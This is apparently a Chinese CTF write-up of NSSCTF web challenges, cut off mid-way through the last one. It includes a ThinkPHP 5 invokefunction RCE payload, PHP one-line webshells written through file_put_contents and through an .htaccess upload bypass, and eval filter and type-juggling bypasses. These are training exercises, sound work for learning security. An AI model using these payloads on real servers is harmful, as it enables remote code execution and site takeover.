<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NESTEDTEXT"><figure class="iseeu highlight /nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">:</span> <span class="string">*</span></span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string"> /NSS/index.php/</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b1fbc0d0e0a243d4ffe1cd.png"><br>访问之后的界面。所以去搜下thinkphp v5漏洞 找到rce漏洞</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=index/think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure></div>
<p>修改最后的值就能执行任意命令了<br>下面省略了前面的，只有命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">bin boot dev etc flag home lib lib64 media mnt nss opt <span class="keyword">proc</span><span class="title"> root</span> run<span class="title"> sbin</span> srv<span class="title"> sys</span> tmp<span class="title"> usr</span> var<span class="title"> var</span> 好熟悉的界面 似曾相识啊<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">cat</span> /flag</span><br><span class="line">好熟悉的界面 似曾相识啊  #说明是文件夹</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里flag是空的，那就用蚁剑连接去找，写一个一句话木马</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这里将一句话木马写入文件shell.php<br><img src="https://pic1.imgdb.cn/item/67b1ff0ad0e0a243d4ffe262.png"><br><img src="https://pic1.imgdb.cn/item/67b1ff7ad0e0a243d4ffe26c.png"><br>在nss目录下找到flag</p>
<h1 id="funny-php"><a href="#funny-php" class="headerlink" title="funny_php"></a>funny_php</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])&lt;=<span class="number">3</span>&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]&gt;<span class="number">999999999</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;:D&quot;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;L1&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;:C&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/NSSCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;NSSCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;wow&quot;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;L2&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Nice!&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;yoxi!&quot;</span>;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;L3&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;X(&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;G&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>].<span class="string">&quot;\n&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L2&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里最后就是要把<code>L1</code> <code>L2</code> <code>L3</code>都设置就可以得到flag</p>
<ol>
<li>L1<br>只能三个字符，但是数值要大于999999999，所以用科学计数法2e9</li>
<li>L2<br>这里preg_replace把敏感词置换为空，所以我们可用双写<code>NSSNSSCTFCTF</code>,这样子中间的NSSCTF就不会显示</li>
<li>L3<br>又是考查一样的md5，但是这里要求两个都是纯字母<br>所以可以选<code>EEIZDOI</code> <code>QLTHNDT</code><br><img src="https://pic1.imgdb.cn/item/67b204f4d0e0a243d4ffe2e0.png"></li>
</ol>
<h1 id="funny-web"><a href="#funny-web" class="headerlink" title="funny_web"></a>funny_web</h1><p><img src="https://pic1.imgdb.cn/item/67b2dabed0e0a243d40024e3.png"><br><img src="https://pic1.imgdb.cn/item/67b2dad1d0e0a243d40024e8.png"><br>直接从web这边入手不知道这个实验室名到底是什么意思<br>目录扫描了一下也没有发现其他的目录，只能看wp得到用户密码<br>用户 NSS，密码 2122693401<br>得到题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这为何相等又不相等&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里要了解php的intval()函数，<br>intval() 是 PHP 的一个函数，它用于将变量转换为整数（integer）。它的基本用法如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure></div>
<p>$value（必需）：要转换的值，可以是字符串、浮点数、布尔值等。<br>$base（可选）：进制，默认为 10。仅当 $value 是字符串时有效，可用于转换不同进制的数字（如二进制、十六进制）。<br>这里有多种方法可以绕过inval函数，可以用小数点，字符等<br><img src="https://pic1.imgdb.cn/item/67b2dc5ad0e0a243d4002585.png"></p>
<h1 id="webdog1-start"><a href="#webdog1-start" class="headerlink" title="webdog1__start"></a>webdog1__start</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Do</span> you really reading <span class="keyword">to</span> <span class="keyword">start</span> be a web dog? <span class="keyword">DO</span> you think you go here <span class="keyword">from</span> <span class="keyword">where</span>?</span><br><span class="line">are you readying <span class="keyword">to</span> <span class="keyword">start</span>?</span><br></pre></td></tr></table></figure></div>
<p>页面源代码中有提示</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (isset($_GET[&#x27;web&#x27;]))</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    $first=$_GET[&#x27;web&#x27;];</span></span><br><span class="line"><span class="comment">    if ($first==md5($first)) </span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>然后去&#x2F;robots.txt中，看到有一个f14g.php文件的地址，访问之后还是没有什么别的信息<br>看了wp才知道要去f12网络中的标头找到hint。。。。。<br>然后找到真正的题目地址<code>F1l1l1l1l1lag.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$get</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$get</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too long.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$get</span>);</span><br><span class="line">          &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里过滤了空格，然后把flag替换成空格<br>这里有两种方法，第一种是用%09也就是制表符&#x2F;t代替空格<br><code>?get=system(&#39;cat%09/*&#39;)</code>这里只能把根目录下面所有的内容都打印出来，不过这里也就只有flag了<br>法二，题目是执行<code>get</code>的内容，但是我们可以让这个get再去执行我们自己设置的一个参数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?get=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);&amp;a=<span class="keyword">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>这里要注意一下第一个get参数赋值完之后要写一个<code>;</code>,这样子这句话中的eval语句才结束，然后被外面一层eval识别。</p>
<h1 id="Ez-upload"><a href="#Ez-upload" class="headerlink" title="Ez_upload"></a>Ez_upload</h1><p><img src="https://pic1.imgdb.cn/item/67b30478d0e0a243d4003c84.png"><br>一道上传文件的题目，我先上传了一个一句话木马，出现<code>后缀名不能有ph！</code>,这里如果是说不能是php我们就可以用不同的php后缀名，比如php3 php5 phtml等绕过。<br>这里先改后缀上传，然后用bp修改后缀看看，这里也不是在前端就校验，所以还是不行<br>首先是 如果直接上传普通的一句话木马，给出的错误是不能有ph<br>然后是抓包修改文件类型,还是提示提示不能有ph，所以是在后端做的校验，直接上传jpg文件<br>发现显示，还是换个类型吧，但是真的jpg这个类型不可以吗，我把文件的内容删掉，再上传<br>发现可以成功上传，难道是eval这个函数的或者POST之类的被过滤了，现在把<code>&lt;?php ?&gt;</code>删去，上传剩下的eval部分的内容的jpg文件  –&gt;成功上传<br>那就说明了是<code>&lt;?php ?&gt; </code>的问题了，到这我们就知道要用script版本的一句话木马了<br>所以最后.htaccess配置文件的方式，让上传的jpg文件解析成php文件。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这个文件就是apache服务器里面文件夹下的1.jpg都解析成php文件<br>然后要用bp抓包上传这个文件，把content-type修改一下<br><img src="https://pic1.imgdb.cn/item/67b2f4aed0e0a243d4002fc8.png"><br>然后就可以用蚁剑连接了，但是这里的flag是空的<br><img src="https://pic1.imgdb.cn/item/67b2ffc6d0e0a243d400383d.png"><br>如果在根目录下没有flag那基本就是在环境变量或者phpinfo里面<br>在蚁剑的虚拟终端里面输入php -i就可以查看php的信息了包括环境变量，然后找到了flag<br><img src="https://pic1.imgdb.cn/item/67b3006dd0e0a243d40039c5.png"></p>
<h1 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h1><p><img src="https://pic1.imgdb.cn/item/67b304e8d0e0a243d4003cb2.png"><br>题目描述：简简单单的迷惑游戏<br>但是用f12和右键都不能看源代码，那就在url中加上<code>view-source:</code>就能看源代码<br><img src="https://pic1.imgdb.cn/item/67b3066ed0e0a243d4003d4e.png"><br>点击链接跳转到题目代码界面</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var <span class="built_in">input</span> = $(<span class="string">&#x27;input&#x27;</span>),</span><br><span class="line">    input_val = parseInt(<span class="built_in">input</span>.val()),</span><br><span class="line">    btn_add = $(<span class="string">&#x27;.add&#x27;</span>),</span><br><span class="line">    btn_remove = $(<span class="string">&#x27;.remove&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>.keyup(<span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    input_val = parseInt(<span class="built_in">input</span>.val())</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn_add.click(<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span> &#123;</span><br><span class="line">    input_val++;</span><br><span class="line">    <span class="built_in">input</span>.val(input_val);</span><br><span class="line">    console.<span class="built_in">log</span>(input_val);</span><br><span class="line">    <span class="keyword">if</span>(input_val==<span class="number">18</span>)&#123;</span><br><span class="line">        input_val=<span class="number">-20</span>;</span><br><span class="line">        <span class="built_in">input</span>.val(<span class="number">-20</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn_remove.click(<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span> &#123;</span><br><span class="line">    input_val<span class="comment">--;</span></span><br><span class="line">    <span class="built_in">input</span>.val(input_val);</span><br><span class="line">&#125;);</span><br><span class="line">// NSSCTF&#123;TnNTY1RmLnBocA==&#125;</span><br></pre></td></tr></table></figure></div>
<p>先用base64解码一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TnNTY1RmLnBocA== | <span class="built_in">base64</span> -d</span><br><span class="line">NsScTf.php  </span><br></pre></td></tr></table></figure></div>
<p>果然不会这么好心直接给flag </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个hint的意思就是POST了<br>PHP 中的 <code>call_user_func()</code>函数：<br>call_user_func() 是 PHP 的一个回调函数调用方法，它可以用于 动态调用函数 或 类的方法，即在运行时决定要执行哪个函数，而不是在代码编写时就固定。<br>这里用到call_user_func()中的调用类的方法  例子：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    static function sayHello(<span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="variable">$name</span>!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo call_user_func([<span class="string">&quot;Demo&quot;</span>, <span class="string">&quot;sayHello&quot;</span>], <span class="string">&quot;Alice&quot;</span>); </span><br></pre></td></tr></table></figure></div>
<p>所以传入一个数组，数组中的第一个值时类名，第二个是调用的静态方法名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?p[<span class="number">0</span>]=nss&amp;p[<span class="number">1</span>]=ctf</span><br><span class="line">有没有一种可能，类是nss2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?p[<span class="number">0</span>]=nss2&amp;p[<span class="number">1</span>]=ctf</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&quot;NSSCTF&#123;ae335328-f4f3-443f-a850-22d5f617a7b8&#125;&quot;</span>;</span><br></pre></td></tr></table></figure></div>
<p>在注释中找到flag</p>
<h1 id="xff"><a href="#xff" class="headerlink" title="xff"></a>xff</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIZAR"><figure class="iseeu highlight /mizar"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Must <span class="keyword">be</span> accessed <span class="keyword">from</span> Xiaohong&#x27;s own computer.</span><br></pre></td></tr></table></figure></div>
<p>估计就是考X-Forwarded-for了<br><img src="https://pic1.imgdb.cn/item/67b321dfd0e0a243d400462e.png"><br>修改请求头加上X-Forwarded-For: 127.0.0.1</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Must be jump <span class="selector-tag">from</span> Home <span class="attribute">Page</span>.</span><br></pre></td></tr></table></figure></div>
